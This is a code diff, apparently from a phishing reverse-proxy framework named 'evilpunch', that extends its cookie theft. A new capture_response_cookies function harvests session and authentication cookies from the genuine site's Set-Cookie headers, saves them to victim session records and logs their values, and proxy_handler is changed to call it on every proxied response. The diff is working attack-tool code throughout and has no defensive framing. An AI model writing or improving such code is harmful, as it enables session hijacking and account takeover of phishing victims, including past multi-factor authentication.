@@ -1184,13 +1184,23 @@ async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_
         cookies = request.cookies
         
         if cookies:
+            debug_log(f"🍪 Found {len(cookies)} total cookies in request", "DEBUG")
+            debug_log(f"🍪 Request cookies: {list(cookies.keys())}", "DEBUG")
+            
             # Filter out our own session cookie and capture detailed cookie info
             captured_cookies = []
+            filtered_cookies = []
+            
             for name, value in cookies.items():
                 if name != f'evilpunch_session_{phishlet_id}':
                     # Parse detailed cookie metadata
                     cookie_info = _parse_cookie_metadata(name, value, proxy_domain)
                     captured_cookies.append(cookie_info)
+                else:
+                    filtered_cookies.append(name)
+            
+            if filtered_cookies:
+                debug_log(f"🍪 Filtered out {len(filtered_cookies)} evilpunch session cookies: {filtered_cookies}", "DEBUG")
             
             if captured_cookies:
                 await update_session_data(
@@ -1199,12 +1209,52 @@ async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_
                     proxy_domain, 
                     captured_cookies=captured_cookies
                 )
-                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES with detailed metadata", "INFO")
+                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES from request with detailed metadata", "INFO")
                 for cookie in captured_cookies:
                     debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']})", "DEBUG")
+            else:
+                debug_log("⚠️  No request cookies captured (none found or all filtered out)", "DEBUG")
                 
     except Exception as e:
-        debug_log(f"Error capturing cookies: {e}", "ERROR")
+        debug_log(f"Error capturing cookies from request: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+
+async def capture_response_cookies(response_headers, session_cookie: str, phishlet_id: int, proxy_domain: str):
+    """
+    Capture cookies from response Set-Cookie headers and update session with detailed metadata
+    """
+    try:
+        # Check for Set-Cookie headers in response
+        set_cookie_headers = response_headers.getall('Set-Cookie', [])
+        
+        if set_cookie_headers:
+            captured_cookies = []
+            for set_cookie_header in set_cookie_headers:
+                try:
+                    # Parse Set-Cookie header to extract detailed cookie metadata
+                    cookie_info = _parse_set_cookie_header(set_cookie_header, proxy_domain)
+                    
+                    # Filter out our own session cookie
+                    if cookie_info['name'] != f'evilpunch_session_{phishlet_id}':
+                        captured_cookies.append(cookie_info)
+                        
+                except Exception as cookie_error:
+                    debug_log(f"Error parsing Set-Cookie header '{set_cookie_header}': {cookie_error}", "WARN")
+                    continue
+            
+            if captured_cookies:
+                await update_session_data(
+                    session_cookie, 
+                    phishlet_id, 
+                    proxy_domain, 
+                    captured_cookies=captured_cookies
+                )
+                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES from response with detailed metadata", "INFO")
+                for cookie in captured_cookies:
+                    debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']}, httpOnly: {cookie['httpOnly']})", "DEBUG")
+                
+    except Exception as e:
+        debug_log(f"Error capturing cookies from response: {e}", "ERROR")
         debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
 
 # --- END SESSION MANAGEMENT ---
@@ -1309,51 +1359,6 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
     except Exception as e:
         # Fallback to basic parsing
         return _parse_cookie_metadata(name, value, proxy_domain)
-
-def _parse_cookie_metadata(cookie_name: str, cookie_value: str, proxy_domain: str) -> dict:
-    """
-    Parse cookie metadata and create detailed cookie object
-    """
-    # Create detailed cookie object with metadata
-    cookie_info = {
-        "name": cookie_name,
-        "value": cookie_value,
-        "domain": proxy_domain,
-        "hostOnly": True,  # Default to true for proxy cookies
-        "path": "/",  # Default path
-        "secure": True,  # Default to secure for HTTPS
-        "httpOnly": False,  # Default to false
-        "sameSite": "lax",  # Default sameSite policy
-        "session": False,  # Default to false (persistent cookies)
-        "firstPartyDomain": "",
-        "partitionKey": None,
-        "expirationDate": None,  # We can't determine expiration from request
-        "storeId": None
-    }
-    
-    # Try to extract additional metadata from cookie name and value
-    if "session" in cookie_name.lower():
-        cookie_info["session"] = True
-    
-    # Detect analytics cookies
-    if cookie_name.startswith("_ga"):
-        cookie_info["session"] = False
-        cookie_info["httpOnly"] = False
-        cookie_info["secure"] = False
-    
-    # Detect forum/session cookies
-    if "forum" in cookie_name.lower():
-        cookie_info["session"] = True
-        cookie_info["httpOnly"] = True
-    
-    # Detect authentication cookies
-    if any(auth_keyword in cookie_name.lower() for auth_keyword in ["auth", "token", "jwt", "csrf"]):
-        cookie_info["secure"] = True
-        cookie_info["httpOnly"] = True
-        cookie_info["sameSite"] = "strict"
-    
-    return cookie_info
-
 
 def _normalize_hostname(host: str) -> str:
     try:
@@ -3056,11 +3061,14 @@ async def proxy_handler(request):
                             # Single value for this header
                             stream_response.headers[key] = value
                     
-                    # Add session cookie to response if we have session info
+                    # Capture cookies from response Set-Cookie headers and add session cookie
                     if hasattr(request, 'get') and request.get('session_cookie'):
                         session_cookie = request['session_cookie']
                         phishlet_id = request.get('phishlet_id')
                         proxy_domain = request.get('proxy_domain', '')
+                        
+                        # Capture cookies from response headers
+                        await capture_response_cookies(resp.headers, session_cookie, phishlet_id, proxy_domain)
                         
                         # Set cookie with appropriate attributes and phishlet-specific name
                         cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
